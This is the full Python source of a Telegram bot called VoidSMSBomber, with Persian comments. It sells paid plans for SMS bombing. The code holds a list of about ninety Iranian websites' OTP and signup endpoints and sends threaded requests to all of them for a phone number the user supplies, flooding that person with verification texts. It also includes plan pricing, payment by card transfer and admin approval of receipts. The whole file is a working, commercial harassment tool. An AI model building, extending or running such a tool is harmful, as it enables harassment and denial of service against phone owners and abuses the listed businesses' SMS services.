import random
import threading
import time
import requests
import phonenumbers
import os
import json
import telebot
from telebot import types
from flask import Flask

# ==========================================
# وب‌سرور کوچک برای جلوگیری از خطای پورت در Render
# ==========================================
app = Flask(__name__)

@app.route('/')
def health():
    return "Bot is running!", 200

def run_web():
    port = int(os.environ.get("PORT", 8080))
    # استفاده از use_reloader=False برای جلوگیری از خطا در محیط سرور
    app.run(host='0.0.0.0', port=port, use_reloader=False)

# اجرای وب‌سرور در پس‌زمینه
threading.Thread(target=run_web, daemon=True).start()

# ==========================================
# تنظیمات اولیه ربات
# ==========================================
BOT_TOKEN = os.environ.get('BOT_TOKEN')
ADMIN_ID = 6914309071
CARD_NUMBER = "6219861451091986"
DB_FILE = "users_db.json"

bot = telebot.TeleBot(BOT_TOKEN, threaded=False)

def load_db():
    if os.path.exists(DB_FILE):
        with open(DB_FILE, "r") as f:
            return json.load(f)
    return {}

def save_db(db):
    with open(DB_FILE, "w") as f:
        json.dump(db, f)

user_states = {} 
pending_approvals = {} 

PLANS = {
    "basic": {"name": "پلن پایه (Basic)", "price": 150, "uses": 10, "description": "مناسب برای تست\n⚡ سرعت: معمولی\n📱 ارسال به ۱۰ شماره"},
    "pro": {"name": "پلن حرفه‌ای (Pro)", "price": 450, "uses": 50, "description": "مناسب روزانه\n🚀 سرعت: بالا\n📱 ارسال به ۵۰ شماره"},
    "vip": {"name": "پلن ویژه (VIP)", "price": 600, "uses": 9999, "description": "قدرت نامحدود\n🔥 سرعت: اولترا\n📱 ارسال نامحدود"}
}

# ==========================================
# بخش بمبر
# ==========================================
class Bomber:
    def __init__(self, phone_number, log_callback=None):
        self.phone_number = phone_number
        self.log_callback = log_callback
        self.services = []
        self.load_services()
        self.session = requests.Session()
        self.stop_event = threading.Event()
        self.success_count = 0
        self.fail_count = 0

    def log(self, message):
        if self.log_callback:
            self.log_callback(message)

    def load_services(self):
        # ⚠️⚠️⚠️ لیست کامل سرویس‌های خودت رو اینجا کپی کن ⚠️⚠️⚠️
        self.services = [
            {'name': 'Digikala Jet', 'url': 'https://api.digikalajet.ir/user/login-register/', 'method': 'POST', 'data': lambda: {"phone": self.phone_number}, 'json': True},
            {'name': 'Jabama', 'url': 'https://taraazws.jabama.com/api/v4/account/send-code', 'method': 'POST', 'data': lambda: {"mobile": self.phone_number}, 'json': True},
            {'name': 'SimKhan First', 'url': 'https://www.simkhanapi.ir/api/users/registerV2', 'method': 'POST', 'data': lambda: {"mobileNumber": "0" + self.phone_number.split("+98")[1], "ReSendSMS": False}, 'json': True},
            {'name': 'Gap', 'url': 'https://core.gap.im/v1/user/add.json', 'method': 'GET', 'data': lambda: {"mobile": self.phone_number}, 'json': False},
            {'name': 'Behtarino', 'url': 'https://bck.behtarino.com/api/v1/users/jwt_phone_verification/', 'method': 'POST', 'data': lambda: {"phone": self.phone_number}, 'json': True},
            {'name': 'Hamrahsport', 'url': 'https://hamrahsport.com/send-otp', 'method': 'POST', 'data': lambda: {"cell": self.phone_number.split("+98")[1], "name": "test", "agree": "1", "send_otp": "1", "otp": ""}, 'json': False},
            {'name': 'Buskool', 'url': 'https://www.buskool.com/send_verification_code', 'method': 'POST', 'data': lambda: {"phone": "0" + self.phone_number.split("+98")[1]}, 'json': True},
            {'name': 'SnapFood', 'url': 'https://snappfood.ir/mobile/v2/user/loginMobileWithNoPass', 'method': 'POST', 'data': lambda: {"cellphone": "0" + self.phone_number.split("+98")[1]}, 'json': False},
            {'name': 'Harikashop', 'url': 'https://harikashop.com/login?back=my-account', 'method': 'POST', 'data': lambda: {"username": "0" + self.phone_number.split("+98")[1], "id_customer": "", "firstname": "test", "lastname": "test", "password": "test12345", "action": "register", "ajax": "1"}, 'json': False},
            {'name': 'Ghabzino', 'url': 'https://application2.billingsystem.ayantech.ir/WebServices/Core.svc/requestActivationCode', 'method': 'POST', 'data': lambda: {"Parameters": {"ApplicationType": "Web", "ApplicationUniqueToken": None, "ApplicationVersion": "1.0.0", "MobileNumber": "0" + self.phone_number.split("+98")[1]}}, 'json': True},
            {'name': 'See5', 'url': 'https://crm.see5.net/api_ajax/sendotp.php', 'method': 'POST', 'data': lambda: {"mobile": "0" + self.phone_number.split("+98")[1], "action": "sendsms"}, 'json': False},
            {'name': 'Divar', 'url': 'https://api.divar.ir/v5/auth/authenticate', 'method': 'POST', 'data': lambda: {"phone": self.phone_number}, 'json': True},
            {'name': 'Alibaba', 'url': 'https://ws.alibaba.ir/api/v3/account/mobile/otp', 'method': 'POST', 'data': lambda: {"phoneNumber": "0" + self.phone_number.split("+98")[1]}, 'json': True},
            {'name': 'Mobit', 'url': 'https://api.mobit.ir/api/web/v8/register/register', 'method': 'POST', 'data': lambda: {"number": self.phone_number}, 'json': True},
            {'name': 'PakhshShop', 'url': 'https://www.pakhsh.shop/wp-admin/admin-ajax.php', 'method': 'POST', 'data': lambda: {"action": "digits_check_mob", "countrycode": "%2B98", "mobileNo": "0" + self.phone_number.split("+98")[1], "csrf": "fdaa7fc8e6", "login": "2", "username": "", "email": "", "captcha": "", "captcha_ses": "", "json": "1", "whatsapp": "0"}, 'json': False},
            {'name': 'Kilid', 'url': 'https://server.kilid.com/global_auth_api/v1.0/authenticate/login/realm/otp/start?realm=PORTAL', 'method': 'POST', 'data': lambda: {"mobile": "0" + self.phone_number.split("+98")[1]}, 'json': True},
            {'name': 'Lendo Register', 'url': 'https://lendo.ir/register', 'method': 'POST', 'data': lambda: {"_token": "mXBVe062llzpXAxD5EzN4b5yqrSuWJMVPl1dFTV6", "mobile": "0" + self.phone_number.split("+98")[1], "password": "ibvvb@3#9nc"}, 'json': False},
            {'name': 'GapFilm', 'url': 'https://core.gapfilm.ir/api/v3.1/Account/Login', 'method': 'POST', 'data': lambda: {"Type": "3", "Username": self.phone_number[1:]}, 'json': True},
            {'name': 'Nazdikeh', 'url': 'https://www.nazdikeh.com/api/customers/login-register', 'method': 'POST', 'data': lambda: {"step": 1, "ReturnUrl": "/", "mobile": "0" + self.phone_number.split("+98")[1]}, 'json': False},
            {'name': 'Janebi', 'url': 'https://janebi.com/signin', 'method': 'POST', 'data': lambda: {"user_mobile": "0" + self.phone_number.split("+98")[1], "confirm_code": "", "popup": 1, "signin": 1}, 'json': False},
            {'name': '70Kala', 'url': 'https://70kala.ir/wp-json/pinova/user/authenticate', 'method': 'POST', 'data': lambda: {"identifier": "0" + self.phone_number.split("+98")[1]}, 'json': True},
            {'name': 'Doozshop', 'url': 'https://doozshop.com/wp-admin/admin-ajax.php', 'method': 'POST', 'data': lambda: {"action": "mobile_login", "mobile": "0" + self.phone_number.split("+98")[1], "step": "send_code"}, 'json': False},
            {'name': 'Iranmojo', 'url': 'https://iranmojo.com/wp-admin/admin-ajax.php', 'method': 'POST', 'data': lambda: {"recaptcha_token": None, "phone": "0" + self.phone_number.split("+98")[1], "controller": "auth-register_phone", "action": "iranmojo_guest", "dev": 2024}, 'json': False},
            {'name': '19Kala', 'url': 'https://www.19kala.com/users/register', 'method': 'POST', 'data': lambda: {"mobile": "0" + self.phone_number.split("+98")[1], "password": "12345678e", "agree": 1}, 'json': True},
            {'name': 'Abadis', 'url': 'https://abadis.ir/user/ajaxcmd/registernew/', 'method': 'POST', 'data': lambda: {"loginID": "0" + self.phone_number.split("+98")[1]}, 'json': False},
            {'name': 'Anardoni', 'url': 'https://api.anardoni.com/api/v2/auth/v2/send_code', 'method': 'POST', 'data': lambda: {"mobile": "0" + self.phone_number.split("+98")[1], "verify_code_type": "login"}, 'json': True},
            {'name': 'Anten', 'url': 'https://api2.anten.ir/ids/api/auth/register', 'method': 'POST', 'data': lambda: {"phone": "0" + self.phone_number.split("+98")[1]}, 'json': True},
            {'name': 'Boghrat', 'url': 'https://admapi.boghrat.com/boghratsite/Account/RegisterOTP', 'method': 'POST', 'data': lambda: {"Phonenumber": "0" + self.phone_number.split("+98")[1], "recaptcha": None, "AppointmentCode": ""}, 'json': True},
            {'name': 'Delino', 'url': 'https://www.delino.com/User/PreRegister', 'method': 'POST', 'data': lambda: {"mobile": "0" + self.phone_number.split("+98")[1]}, 'json': False},
            {'name': 'EBPNovin', 'url': 'https://www.ebpnovin.com/index.php?route=users/login', 'method': 'POST', 'data': lambda: {"username": "0" + self.phone_number.split("+98")[1]}, 'json': False},
            {'name': 'Esam', 'url': 'https://api.esam.ir/api/account/v3/RegisterUserv3', 'method': 'POST', 'data': lambda: {"mobile": "0" + self.phone_number.split("+98")[1], "present_type": "WebApp", "registration_method": 0, "serialNumber": ""}, 'json': True},
            {'name': 'Flytoday', 'url': 'https://www.flytoday.ir/api/collect', 'method': 'POST', 'data': lambda: {"plaintext": "+98" + self.phone_number.split("+98")[1]}, 'json': True},
            {'name': 'IranConcert', 'url': 'https://www.iranconcert.com/user/check', 'method': 'POST', 'data': lambda: {"mobile": "0" + self.phone_number.split("+98")[1]}, 'json': True},
            {'name': 'Iranecar', 'url': 'https://nextapi.iranecar.com/auth/api/v1/User/GetUserBaseInfo', 'method': 'POST', 'data': lambda: {"emailOrNumber": "0" + self.phone_number.split("+98")[1], "userType": "siteUser"}, 'json': True},
            {'name': 'Malltina', 'url': 'https://api.malltina.com/api/v2/check-user', 'method': 'POST', 'data': lambda: {"user": "0" + self.phone_number.split("+98")[1]}, 'json': True},
            {'name': 'Mizito', 'url': 'https://app.mizito.ir/capi/session/register', 'method': 'POST', 'data': lambda: {"step": 1, "activate_method": "sms", "email": "", "phone": "0" + self.phone_number.split("+98")[1], "username": "0" + self.phone_number.split("+98")[1], "pin_code": "", "firstname": "", "lastname": "", "workspace_name": "", "password": "", "repassword": "", "teammates": [{"name": "", "email_phone": ""}], "validated": False}, 'json': True},
            {'name': 'Netbarg', 'url': 'https://netbarg.com/tehran/users/loginByMobile/', 'method': 'POST', 'data': lambda: {"_method": "POST", "phone": "0" + self.phone_number.split("+98")[1]}, 'json': True},
            {'name': 'Ravandarman', 'url': 'https://papi.ravandarman.com/register/fast', 'method': 'POST', 'data': lambda: {"firstName": "f", "lastName": "q", "gender": 0, "registerField": "tel", "termsAndConditions": True, "tel": "0" + self.phone_number.split("+98")[1]}, 'json': True},
            {'name': 'Sheypoor', 'url': 'https://www.sheypoor.com/api/v10.0.0/auth/send', 'method': 'POST', 'data': lambda: {"username": "0" + self.phone_number.split("+98")[1]}, 'json': True},
            {'name': 'AbreHamrahi', 'url': 'https://abrehamrahi.ir/api/v6/profile/auth/generate-code/', 'method': 'POST', 'data': lambda: {"phone": self.phone_number.split("+98")[1], "prefix": "+98"}, 'json': True},
            {'name': 'Axon', 'url': 'https://axon.me/services/api/identity-service/v1/users/register-login/phr', 'method': 'POST', 'data': lambda: {"phoneNumber": "0" + self.phone_number.split("+98")[1], "serviceName": "AXON", "needTag": True, "sendAudioOtp": False}, 'json': True},
            {'name': 'Bimebazar', 'url': 'https://bimebazar.com/accounts/api/login_sec/', 'method': 'POST', 'data': lambda: {"username": "0" + self.phone_number.split("+98")[1], "type": "sms"}, 'json': True},
            {'name': 'Booking.ir', 'url': 'https://ws.booking.ir/nagaapi/api/v2/account/sendmobileverificationcode/', 'method': 'POST', 'data': lambda: {"mobile": self.phone_number.split("+98")[1], "countryCode": "ir"}, 'json': True},
            {'name': 'Cafebazaar', 'url': 'https://api.cafebazaar.ir/rest-v1/process/GetOtpTokenRequest', 'method': 'POST', 'data': lambda: {"properties": {"language": 2, "clientID": "ejzbxi83legfl7xgp32qxq4ye4g38oyf", "deviceID": "ejzbxi83legfl7xgp32qxq4ye4g38oyf", "clientVersion": "web"}, "singleRequest": {"getOtpTokenRequest": {"username": "98" + self.phone_number.split("+98")[1]}}}, 'json': True},
            {'name': 'Eligasht', 'url': 'https://api2.eligasht.com/api/account/register', 'method': 'POST', 'data': lambda: {"userName": "0" + self.phone_number.split("+98")[1], "recaptchaToken": None}, 'json': True},
            {'name': 'ESeminar', 'url': 'https://api.eseminar.tv/api/v1/auth/otp/send', 'method': 'POST', 'data': lambda: {"method": "register", "mobile": "0" + self.phone_number.split("+98")[1]}, 'json': True},
            {'name': 'Footballi', 'url': 'https://api.footballi.net/api/v2/user/check', 'method': 'POST', 'data': lambda: {"login": "0" + self.phone_number.split("+98")[1], "country_code": "+98"}, 'json': True},
            {'name': 'GapFilm v3.2', 'url': 'https://core.gapfilm.ir/api/v3.2/Account/Login', 'method': 'POST', 'data': lambda: {"Method": 1, "PhoneNo": self.phone_number.split("+98")[1]}, 'json': True},
            {'name': 'GSM.ir', 'url': 'https://marketplace.gsm.ir/api/v1/user/login/', 'method': 'POST', 'data': lambda: {"phone_number": "+98" + self.phone_number.split("+98")[1]}, 'json': True},
            {'name': 'Haal', 'url': 'https://haal.ir/api/v2/ConsultantConsult/CheckConsultantExist', 'method': 'POST', 'data': lambda: {"Mobile": "0" + self.phone_number.split("+98")[1]}, 'json': True},
            {'name': 'HamyarWP', 'url': 'https://hamyarwp.com/wp-admin/admin-ajax.php?action=hfl_login_with_phone&t=1776772989081', 'method': 'POST', 'data': lambda: {"username": "0" + self.phone_number.split("+98")[1]}, 'json': False},
            {'name': 'MrBilit SMS', 'url': 'https://content.mrbilit.ir/sms/get_app/send?to=0' + self.phone_number.split("+98")[1], 'method': 'POST', 'data': lambda: {}, 'json': False},
            {'name': 'Pezeshket', 'url': 'https://api.pezeshket.com/core/v1/auth/requestCodeByMobileV2', 'method': 'POST', 'data': lambda: {"mobileNumber": "0" + self.phone_number.split("+98")[1]}, 'json': True},
            {'name': 'Ring', 'url': 'https://ring.ir/api/v1/auth/otp', 'method': 'POST', 'data': lambda: {"mobile": "+98" + self.phone_number.split("+98")[1]}, 'json': True},
            {'name': 'Roboo', 'url': 'https://api.roboo.ir/api/Users/SendVerificationCode?PhoneNumber=0' + self.phone_number.split("+98")[1] + '&code=1302817798429812', 'method': 'POST', 'data': lambda: {}, 'json': False},
            {'name': 'Salamati24', 'url': 'https://www.salamati24.com/api/activationcode?mobile=0' + self.phone_number.split("+98")[1] + '&as_register=1&roleId=-2', 'method': 'GET', 'data': lambda: {}, 'json': False},
            {'name': 'Talasea', 'url': 'https://api.talasea.ir/api/auth/sentOTP', 'method': 'POST', 'data': lambda: {"phoneNumber": "0" + self.phone_number.split("+98")[1]}, 'json': True},
            {'name': 'Tosinso', 'url': 'https://tosinso.com/api/auth/send-code', 'method': 'POST', 'data': lambda: {"type": "mobile", "value": self.phone_number.split("+98")[1], "countryCode": "+98"}, 'json': True},
            {'name': 'Uploadkon', 'url': 'https://uploadkon.ir/ucp.php?go=sendotp', 'method': 'POST', 'data': lambda: {"phone": "0" + self.phone_number.split("+98")[1]}, 'json': False},
            {'name': 'Virgool', 'url': 'https://virgool.io/api2/app/auth/verify', 'method': 'POST', 'data': lambda: {"identifier": "+98" + self.phone_number.split("+98")[1], "method": "phone", "type": "register"}, 'json': True},
            {'name': 'Yarai', 'url': 'https://chat.yarai.ir/api/v1/otps/request-otp', 'method': 'POST', 'data': lambda: {"phone": "0" + self.phone_number.split("+98")[1], "isAndroid": False}, 'json': True},
            {'name': 'Zigap', 'url': 'https://gateway.zigap.ir/api/v1.9/authenticate/sendotp', 'method': 'POST', 'data': lambda: {"phoneNumber": "+98" + self.phone_number.split("+98")[1]}, 'json': True},
            {'name': 'shadmessenger12', 'url': 'https://shadmessenger12.iranlms.ir/', 'method': 'POST', 'data': lambda: {"phone": "0" + self.phone_number.split("+98")[1]}, 'json': True},
            {'name': 'messengerg2c4', 'url': 'https://messengerg2c4.iranlms.ir/', 'method': 'POST', 'data': lambda: {"phone": self.phone_number}, 'json': True},
            {'name': 'Baradarantoy', 'url': 'https://baradarantoy.ir/send_confirm_sms_ajax.php', 'method': 'POST', 'data': lambda: {"user_tel": "0" + self.phone_number.split("+98")[1]}, 'json': False},
            {'name': 'Chechilas', 'url': 'https://chechilas.com/user/login', 'method': 'POST', 'data': lambda: {"mob": "0" + self.phone_number.split("+98")[1]}, 'json': False},
            {'name': 'Badparak', 'url': 'https://badparak.com/register/request_verification_code', 'method': 'POST', 'data': lambda: {"mobile": "0" + self.phone_number.split("+98")[1]}, 'json': True},
            {'name': 'Ubike', 'url': 'https://ubike.ir/index.php?route=extension/module/websky_otp/send_code', 'method': 'POST', 'data': lambda: {"telephone": "0" + self.phone_number.split("+98")[1]}, 'json': False},
            {'name': 'Primashop', 'url': 'https://primashop.ir/index.php?route=extension/module/websky_otp/send_code', 'method': 'POST', 'data': lambda: {"telephone": "0" + self.phone_number.split("+98")[1]}, 'json': False},
            {'name': 'Payagym', 'url': 'https://payagym.com/wp-admin/admin-ajax.php', 'method': 'POST', 'data': lambda: {"mobile": "0" + self.phone_number.split("+98")[1], "action": "kerasno_proform_register_inline_send"}, 'json': False},
            {'name': 'Bartarinha', 'url': 'https://bartarinha.com/Advertisement/Users/RequestLoginMobile', 'method': 'POST', 'data': lambda: {"mobileNo": "0" + self.phone_number.split("+98")[1], "X-Requested-With": "XMLHttpRequest"}, 'json': False},
            {'name': 'Manoshahr', 'url': 'https://manoshahr.ir/jq.php', 'method': 'POST', 'data': lambda: {"mobile": "0" + self.phone_number.split("+98")[1], "class_name": "public_login", "function_name": "sendCode"}, 'json': False},
            {'name': 'Nalinoco', 'url': 'https://www.nalinoco.com/api/customers/login-register', 'method': 'POST', 'data': lambda: {"mobile": "0" + self.phone_number.split("+98")[1], "ReturnUrl": "/", "step": "1"}, 'json': True},
            {'name': 'Dastaneman', 'url': 'https://dastaneman.com/User/SendCode', 'method': 'POST', 'data': lambda: {"mobile": "0098" + self.phone_number.split("+98")[1]}, 'json': True},
            {'name': 'Kanoonbook', 'url': 'https://www.kanoonbook.ir/store/customer_otp', 'method': 'POST', 'data': lambda: {"customer_username": self.phone_number.split("+98")[1], "task": "customer_phone"}, 'json': True},
            {'name': 'Cheshmandazketab', 'url': 'https://www.cheshmandazketab.ir/Register', 'method': 'POST', 'data': lambda: {"phone": "0" + self.phone_number.split("+98")[1], "login": "1"}, 'json': False},
            {'name': 'Janebi Alt', 'url': 'https://janebi.com/signin?do', 'method': 'POST', 'data': lambda: {"resend": "0" + self.phone_number.split("+98")[1]}, 'json': False},
            {'name': 'SimKhan Resend', 'url': 'https://www.simkhanapi.ir/api/users/registerV2', 'method': 'POST', 'data': lambda: {"mobileNumber": "0" + self.phone_number.split("+98")[1], "ReSendSMS": True}, 'json': True},
            {'name': 'Hiss Bakala', 'url': 'https://hiss.ir/bakala/ajax/send_code/', 'method': 'POST', 'data': lambda: {"action": "bakala_send_code", "phone_email": "0" + self.phone_number.split("+98")[1]}, 'json': False},
            {'name': 'Twsms', 'url': 'https://twsms.ir/client/register.php', 'method': 'POST', 'data': lambda: {"mobile": "0" + self.phone_number.split("+98")[1], "agree": "agree", "sendsms": "1"}, 'json': False},
            {'name': 'Account724', 'url': 'https://account724.com/wp-admin/admin-ajax.php', 'method': 'POST', 'data': lambda: {"action": "stm_login_register", "type": "mobile", "input": "0" + self.phone_number.split("+98")[1]}, 'json': False},
            {'name': 'Shimashoes', 'url': 'https://shimashoes.com/api/customer/member/register/', 'method': 'POST', 'data': lambda: {"email": "0" + self.phone_number.split("+98")[1]}, 'json': True},
            {'name': 'Novinparse', 'url': 'https://novinparse.com/Page/PageAction.aspx', 'method': 'POST', 'data': lambda: {"Action": "SendVerifyCode", "verifyCode": "", "repeatFlag": "true", "mobile": "0" + self.phone_number.split("+98")[1]}, 'json': False},
            {'name': 'Dalfak', 'url': 'https://www.dalfak.com/api/auth/sendVerificationCode', 'method': 'POST', 'data': lambda: {"type": 1, "value": "0" + self.phone_number.split("+98")[1]}, 'json': True},
            {'name': 'Parkbag', 'url': 'https://parkbag.com/fa/Account/RegisterOrLoginByMobileNumber', 'method': 'POST', 'data': lambda: {"ReturnUrl": "https://parkbag.com/", "MobaileNumber": self.phone_number.split("+98")[1]}, 'json': False},
            {'name': 'Mahouney', 'url': 'https://mahouney.com/fa/Account/RegisterOrLoginByMobileNumber', 'method': 'POST', 'data': lambda: {"ReturnUrl": "https://mahouney.com/", "MobaileNumber": "0" + self.phone_number.split("+98")[1]}, 'json': False},
            {'name': 'Nikanbike', 'url': 'https://nikanbike.com/', 'method': 'POST', 'data': lambda: {"controller": "authentication", "back": "my-account", "fc": "module", "ajax": "true", "module": "iverify", "phone_mobile": "0" + self.phone_number.split("+98")[1], "SubmitCheck": ""}, 'json': False},
            {'name': 'Microele', 'url': 'https://www.microele.com/login?back=my-account', 'method': 'POST', 'data': lambda: {"id_customer": "", "back": ",my-account", "firstname": "123", "lastname": "123", "password": "123456", "action": "register", "username": "0" + self.phone_number.split("+98")[1], "ajax": "1"}, 'json': False},
            {'name': 'RastarAccessory', 'url': 'https://rastaraccessory.ir/api/v1/sessions/login_request', 'method': 'POST', 'data': lambda: {"mobile_phone": "0" + self.phone_number.split("+98")[1]}, 'json': True},
            {'name': 'Myroz', 'url': 'https://myroz.ir/wp-admin/admin-ajax.php', 'method': 'POST', 'data': lambda: {"action": "stm_login_register", "type": "mobile", "input": "0" + self.phone_number.split("+98")[1]}, 'json': False},
            {'name': 'Sunnybook', 'url': 'https://sunnybook.ir/Home/RegisterUser', 'method': 'POST', 'data': lambda: {"name": "Mr", "password": "123456", "mobile": self.phone_number.split("+98")[1]}, 'json': True},
            {'name': 'Adinehbook', 'url': 'https://www.adinehbook.com/gp/flex/sign-in.html', 'method': 'POST', 'data': lambda: {"action": "sign", "phone_cell_or_email": "0" + self.phone_number.split("+98")[1]}, 'json': False},
            {'name': 'Komodaa', 'url': 'https://api.komodaa.com/api/v2.6/loginRC/request', 'method': 'POST', 'data': lambda: {"phone_number": "0" + self.phone_number.split("+98")[1]}, 'json': True},# بقیه سرویس‌ها...
        ]

    def send_request(self, service):
        if self.stop_event.is_set():
            return
        try:
            data = service['data']()
            headers = {'User-Agent': "Mozilla/5.0"}
            method = service['method'].upper()
            use_json = service.get('json', False)

            if method == 'POST':
                if use_json:
                    resp = self.session.post(service['url'], json=data, headers=headers, timeout=5)
                else:
                    resp = self.session.post(service['url'], data=data, headers=headers, timeout=5)
            else:
                resp = self.session.get(service['url'], params=data, headers=headers, timeout=5)

            if resp.status_code in (200, 201, 202, 204):
                self.success_count += 1
            else:
                self.fail_count += 1
        except:
            self.fail_count += 1

    def start(self):
        threads = []
        chunk_size = max(1, len(self.services) // 15)
        chunks = [self.services[i:i + chunk_size] for i in range(0, len(self.services), chunk_size)]
        
        for chunk in chunks:
            t = threading.Thread(target=self.worker, args=(chunk,))
            t.start()
            threads.append(t)
            
        for t in threads:
            t.join()
        self.log(f"✅ پایان! موفق: {self.success_count} | ناموفق: {self.fail_count}")

    def worker(self, subset):
        for service in subset:
            if self.stop_event.is_set():
                break
            self.send_request(service)
            time.sleep(0.2)

# ==========================================
# بخش ربات تلگرام و دکمه‌ها
# ==========================================
@bot.message_handler(commands=['start', 'help'])
def send_welcome(message):
    markup = types.InlineKeyboardMarkup(row_width=1)
    markup.add(
        types.InlineKeyboardButton("🚀 اجرای بمبر", callback_data="run_bomber"),
        types.InlineKeyboardButton("🛒 خرید / ارتقای پلن", callback_data="buy_plan"),
        types.InlineKeyboardButton("📋 پلن من", callback_data="my_plan")
    )
    bot.reply_to(message, "سلام! 👋\nبه ربات **VoidSMSBomber** خوش آمدید.", reply_markup=markup, parse_mode='Markdown')

@bot.callback_query_handler(func=lambda call: True)
def handle_callback(call):
    user_id = str(call.from_user.id)
    
    if call.data == "run_bomber":
        bot.answer_callback_query(call.id)
        db = load_db()
        if user_id not in db or db[user_id].get("remaining_uses", 0) <= 0:
            bot.send_message(call.message.chat.id, "❌ اعتبار کافی ندارید! ابتدا پلن بخرید.")
            return
        bot.send_message(call.message.chat.id, "📞 لطفاً شماره را وارد کنید: `/bomb 09123456789`", parse_mode='Markdown')

    elif call.data == "buy_plan":
        text = "🛒 **لیست پلن‌ها:**\n\n"
        markup = types.InlineKeyboardMarkup(row_width=1)
        for key, plan in PLANS.items():
            text += f"🔹 **{plan['name']}** | {plan['price']} تومان | {plan['uses']} استفاده\n{plan['description']}\n\n"
            markup.add(types.InlineKeyboardButton(f"خرید {plan['name']}", callback_data=f"select_plan_{key}"))
        markup.add(types.InlineKeyboardButton("🔙 بازگشت", callback_data="back_to_menu"))
        bot.edit_message_text(text, call.message.chat.id, call.message.message_id, reply_markup=markup, parse_mode='Markdown')

    elif call.data.startswith("select_plan_"):
        plan_key = call.data.replace("select_plan_", "")
        user_states[user_id] = {"selected_plan": plan_key}
        plan = PLANS[plan_key]
        text = f"✅ شما **{plan['name']}** را انتخاب کردید.\n\n💳 مبلغ **{plan['price']} تومان** را به کارت زیر واریز کنید:\n`{CARD_NUMBER}`\n\n📸 سپس **عکس رسید** را بفرستید."
        bot.edit_message_text(text, call.message.chat.id, call.message.message_id, parse_mode='Markdown')

    elif call.data == "my_plan":
        bot.answer_callback_query(call.id)
        db = load_db()
        if user_id in db:
            plan_name = PLANS[db[user_id]['plan']]['name']
            bot.send_message(call.message.chat.id, f"📋 **وضعیت:**\nپلن: **{plan_name}**\nاستفاده باقی مانده: **{db[user_id]['remaining_uses']}** بار", parse_mode='Markdown')
        else:
            bot.send_message(call.message.chat.id, "📋 شما پلن فعالی ندارید.")

    elif call.data == "back_to_menu":
        bot.answer_callback_query(call.id)
        markup = types.InlineKeyboardMarkup(row_width=1)
        markup.add(
            types.InlineKeyboardButton("🚀 اجرای بمبر", callback_data="run_bomber"),
            types.InlineKeyboardButton("🛒 خرید / ارتقای پلن", callback_data="buy_plan"),
            types.InlineKeyboardButton("📋 پلن من", callback_data="my_plan")
        )
        bot.edit_message_text("منوی اصلی:", call.message.chat.id, call.message.message_id, reply_markup=markup)

    elif call.data.startswith("admin_approve_"):
        req_id = call.data.replace("admin_approve_", "")
        if req_id in pending_approvals:
            data = pending_approvals[req_id]
            uid = data["user_id"]
            plan_key = data["plan"]
            plan = PLANS[plan_key]
            
            db = load_db()
            if uid not in db:
                db[uid] = {"plan": plan_key, "remaining_uses": 0}
            else:
                db[uid]["plan"] = plan_key
                db[uid]["remaining_uses"] += plan["uses"]
            save_db(db)
            
            bot.edit_message_text(f"✅ تایید شد. پلن {plan['name']} برای کاربر {uid} فعال شد.", call.message.chat.id, call.message.message_id)
            bot.send_message(uid, f"🎉 **تبریک!**\nپلن **{plan['name']}** با **{plan['uses']}** بار استفاده فعال شد.", parse_mode='Markdown')
            del pending_approvals[req_id]

    elif call.data.startswith("admin_reject_"):
        req_id = call.data.replace("admin_reject_", "")
        if req_id in pending_approvals:
            uid = pending_approvals[req_id]["user_id"]
            bot.edit_message_text(f"❌ رد شد.", call.message.chat.id, call.message.message_id)
            bot.send_message(uid, "❌ رسید شما رد شد.")
            del pending_approvals[req_id]

@bot.message_handler(content_types=['photo'])
def handle_receipt_photo(message):
    user_id = str(message.from_user.id)
    if user_id not in user_states or "selected_plan" not in user_states[user_id]:
        bot.reply_to(message, "⚠️ ابتدا از منوی 'خرید پلن' یک پلن انتخاب کنید.")
        return
        
    plan_key = user_states[user_id]["selected_plan"]
    plan = PLANS[plan_key]
    req_id = f"{user_id}_{int(time.time())}"
    pending_approvals[req_id] = {"user_id": user_id, "plan": plan_key}
    
    bot.reply_to(message, "✅ رسید دریافت شد. منتظر تایید ادمین باشید.")
    
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        types.InlineKeyboardButton("✅ تایید", callback_data=f"admin_approve_{req_id}"),
        types.InlineKeyboardButton("❌ رد", callback_data=f"admin_reject_{req_id}")
    )
    
    bot.send_message(ADMIN_ID, f"📩 **رسید جدید:**\nکاربر: `{user_id}`\nپلن: **{plan['name']}**", reply_markup=markup, parse_mode='Markdown')
    bot.forward_message(ADMIN_ID, message.chat.id, message.message_id)
    del user_states[user_id]

@bot.message_handler(commands=['bomb'])
def handle_bomb(message):
    user_id = str(message.from_user.id)
    db = load_db()
    
    if user_id not in db or db[user_id].get("remaining_uses", 0) <= 0:
        bot.reply_to(message, "❌ اعتبار کافی ندارید! ابتدا پلن بخرید.")
        return
        
    try:
        phone = message.text.split()[1]
    except IndexError:
        bot.reply_to(message, "❌ شماره را وارد کنید. مثال: /bomb 09123456789")
        return

    if not phone.startswith("+"):
        phone = "+98" + phone.lstrip("0")
        
    db[user_id]["remaining_uses"] -= 1
    save_db(db)
    
    bot.reply_to(message, f"🚀 شروع عملیات برای {phone}...")
    
    bomber = Bomber(phone, lambda m: bot.send_message(message.chat.id, m))
    threading.Thread(target=bomber.start).start()

if __name__ == "__main__":
    print("🤖 ربات و وب‌سرور روشن شدند...")
    bot.infinity_polling()
